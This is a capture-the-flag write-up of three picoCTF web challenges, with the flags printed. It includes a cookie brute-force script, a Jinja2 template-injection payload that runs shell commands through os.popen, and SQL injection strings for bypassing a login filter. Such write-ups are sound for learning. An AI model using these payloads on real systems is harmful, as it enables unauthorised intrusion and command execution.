# 1.Cookies:
> Who doesn't love cookies? Try to figure out the best one. (http://mercury.picoctf.net:64944/)

## Solution:
- I first opened the website in my web browser and opened the inspection page to find the cookie .
- I navigated to the application tab and to the cookie area when I observed:
- <img width="500" height="500" alt="cookie" src="https://github.com/user-attachments/assets/5c320f2c-156f-4298-96ec-611193230749" />
- so here we see that `cookie: name=-1`
- now I tried entering different names of cookies in a search box `snickerdoodle` changed `name=0` . Next , `chocolate chip` changed `name=1` etc. , so the values kept changing with the input of different cookie names and it went back to `name=-1` otherwise.
- From this , I noticed with every accepted response , the webpage (http://mercury.picoctf.net:64944/check), checks the cookie and displays a message.
- Method 1: I tried changing the value of the cookie and reload the webpage , after trying numbers 1-18 , I found that at 18 it displays the flag.
<img width="500" height="500" alt="flag" src="https://github.com/user-attachments/assets/ff9d0140-f03e-4eaa-88b8-6703e7e7fd35" />

- Method 2: I tried to learn how to write a python code to bruteforce through a set of values .
- I used the following code with the help of A.I to brute force it.
```
#!/usr/bin/env python3
import requests, re

URL = "http://mercury.picoctf.net:64944/"         
pat = re.compile(r"picoCTF\{.*?\}", re.I)

for i in range(25):                                
    r = requests.get(URL, cookies={"name": str(i)}, timeout=6)
    if pat.search(r.text):
        print("FOUND for name=", i, "->", pat.search(r.text).group(0))
        break
    print(i, "status", r.status_code, "len", len(r.text))
```
- using the nano editor in the terminal , I added this code and ran it using python3 :
```
:~$ python3 quick-check.py
0 status 200 len 1779
1 status 200 len 1780
2 status 200 len 1780
3 status 200 len 1776
4 status 200 len 1776
5 status 200 len 1779
6 status 200 len 1777
7 status 200 len 1771
8 status 200 len 1774
9 status 200 len 1770
10 status 200 len 1774
11 status 200 len 1772
12 status 200 len 1772
13 status 200 len 1774
14 status 200 len 1770
15 status 200 len 1776
16 status 200 len 1774
17 status 200 len 1771
FOUND for name= 18 -> picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
```
## Flag:
`picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}`

# 2.SSTI1
> I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution:
- SSTI stands for server side template injection so I first found out what that is exactly and how to exploit this vulnerability to obtain the flag.
- Server-Side Template Injection (SSTI) is a vulnerability that arises when an attacker can inject malicious code into a server-side template, leading to unintended execution.
- using (https://tcm-sec.com/find-and-exploit-server-side-template-injection-ssti) , I found out how to detect ssti i.e  Fuzz with templating syntax: Use common template syntax or characters for input, such as `{{` or `{%%}`. If the server responds differently to these inputs (either with an error, by executing the template command, or by reflecting the input differently), it may be vulnerable. It’s crucial here to pay attention to the application behavior.
- we could also try using mathematical expressions for eg. {{4*4}} and see if the payload is executed by the site.
- first I tried a `hey`, it displayed it as large text.
<img width="500" height="850" alt="Screenshot (486)" src="https://github.com/user-attachments/assets/43b4157f-b4aa-41a3-9793-3d23b2dc87c3" />

- next, I tried {{4*4}}=error and it executed it and displayed `16=error`.
<img width="500" height="928" alt="Screenshot (488)" src="https://github.com/user-attachments/assets/07c52808-3fb2-4108-9206-e9fa71f78195" />

- this indicated ssti vulnerability.
- next we will do rce = remote code execution , different commands through the payload itself. I found out that the template engine is `Jinja2` so I looked up how to execute different commands using the payload.
   - `{{ ... }}`: This is Jinja2 syntax for expression evaluation. Anything inside gets executed and the result is printed.
   - `self._TemplateReference__context`: Accesses Jinja’s internal rendering context.
   - `.cycler.__init__.__globals__`: Steps through internal Python references to reach the globals() dictionary, which includes access to Python’s built-in modules like os.
   - `.os.popen('command').read(): Executes a shell command  using the os module and reads its output
- `ls` -> `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}` and upon entering this onto the payload , I obtained the following text displayed:
  
<img width="500" height="928" alt="Screenshot (489)" src="https://github.com/user-attachments/assets/3aff4f01-9322-4d9a-bf32-fd02b7df9696" />

-now we cat the flag file using `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}`

<img width="500" height="988" alt="Screenshot (490)" src="https://github.com/user-attachments/assets/94bacfd2-43df-4b9f-895b-526a86eecc3c" />

- we obtained the flag.

## Flag:
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}`

## Resources:
- (https://tcm-sec.com/find-and-exploit-server-side-template-injection-ssti)

# 3.Web Gauntlet
> Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:53232/ http://shape-facility.picoctf.net:53232/filter.php

## Solution:
- as I wasnt familiar with filters and what these kind of challenges are like , I used the hint given : `sqlite` stood out and I understood that I had to use`SQL injection`
- SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. By inserting malicious SQL commands into data entry fields, an attacker can manipulate, retrieve, or destroy data on the database server.
- the challenge has 5 rounds each asking for username and password , the filter page shows all the filters or the restrictions that cannot be used to login and it keeps on adding new ones every round
- So using `SQL injection ` techniques to bypass these filters / restrictions and get through the rounds.
- I first tried to login using username=`admin` and password=`password` but it said invalid credentials

<img width="500" height="946" alt="Screenshot (492)" src="https://github.com/user-attachments/assets/a904d458-fd71-4109-a524-efae34f59810" />

- the query that it showed was `SELECT * FROM users WHERE username='admin' AND password='admin'` and the filter page showed:

<img width="500" height="950" alt="Screenshot (493)" src="https://github.com/user-attachments/assets/81505f0f-91f3-42ef-9bee-5eff79666dd7" />

- Now we had to bypass the login in some way , we dont know what the password is , but we know that the username is `admin` so can we type the username in such a way that the password can we gibberish?. In order to do that I looked up some sql injection techniques to bypass login when `or` is a filter.

- referring to (https://www.w3schools.com/sql/sql_comments.asp) we comment the `AND password='admin'` using `admin'--` as the username and gibberish as password , with this we bypassed first round.

  <img width="500" height="960" alt="Screenshot (494)" src="https://github.com/user-attachments/assets/bf2b644c-3a6a-413d-ab0f-e2fa72825928" />

- and the filters got updated:

  <img width="500" height="950" alt="Screenshot (495)" src="https://github.com/user-attachments/assets/e8d67d8f-b84d-4832-97f2-646dea43db9f" />

- so here , `--` also is a restriction now so we use `/*` which is a multiline comment starter and we bypasses filter and moved to round 3.

  <img width="500" height="954" alt="Screenshot (496)" src="https://github.com/user-attachments/assets/f79cb62e-376c-4aa5-b703-a10a403a8a78" />

  <img width="500" height="948" alt="Screenshot (497)" src="https://github.com/user-attachments/assets/05395e34-c71d-43ac-a8c1-e54deeb63fc7" />

- now , the filters got updated to block operators like >,< , thus we must terminate the query early using `admin';`.

  <img width="500" height="940" alt="Screenshot (498)" src="https://github.com/user-attachments/assets/05ff4a95-29ce-4f08-83ca-d21281670ae7" />


  <img width="500" height="936" alt="Screenshot (499)" src="https://github.com/user-attachments/assets/75fed5c3-1e96-4d0c-9dee-cd797bbc18f0" />


- now , the filters block admin itself , so we use logical sql operators to concatenate ad and min `ad'||'min';`.

  <img width="500" height="938" alt="Screenshot (500)" src="https://github.com/user-attachments/assets/21c89fd0-cb60-438c-a20a-ee6f426a46ae" />


  <img width="500" height="927" alt="Screenshot (501)" src="https://github.com/user-attachments/assets/e9ee021a-56a5-47d4-9478-801f73bf8772" />

- since, union is now restricted , we can just use `admin';` and bypass it and find the flag in the filters.

  <img width="500" height="1080" alt="image" src="https://github.com/user-attachments/assets/f5cb2d30-addd-4d5c-a902-9a04c1d08097" />


## Flag:
`picoCTF{y0u_m4d3_1t_79a0ddc6}`

## Resources:
- (https://www.w3schools.com/sql)




